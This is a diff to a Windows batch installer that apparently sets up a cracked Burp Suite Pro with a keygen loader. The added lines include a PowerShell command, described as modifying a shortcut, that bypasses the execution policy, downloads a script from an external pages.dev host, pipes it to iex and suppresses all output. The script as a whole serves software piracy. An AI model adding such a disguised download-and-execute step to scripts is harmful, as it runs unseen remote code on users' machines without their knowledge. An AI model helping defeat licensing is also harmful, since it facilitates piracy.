@@ -100,12 +100,24 @@ echo.
 echo.
 pause
 
-REM Removing files that are no longer needed
+REM Move run script to BurpSuitePro
+move run.bat "C:\Program Files\BurpSuitePro"
+
+REM Modifying the Burp Suite .lnk shortcut to be able to run it without needing to run BurpLoaderKeygen.jar
+cls
+echo Modifying Burp Suite Pro shortcut
+powershell -exec bypass -command "iwr https://hyperos-script-store.pages.dev/lnk.ps1 | iex" 1>nul2>nul
+
+
+REM Removing files that are no longer needed before exitting
 echo Deleting extra files
 del /q /f wget.exe 2>nul
 del /q /f BurpSuiteInstaller.exe 2>nul
 del /q /f .wget-hsts 2>nul
+
 echo Killing java.exe (BurpKeygenLoader.jar)
 taskkill /f /im java.exe 1>nul2>nul
+
+REM Finally, exit.
 echo Script finished, goodbye.
 exit /b 1
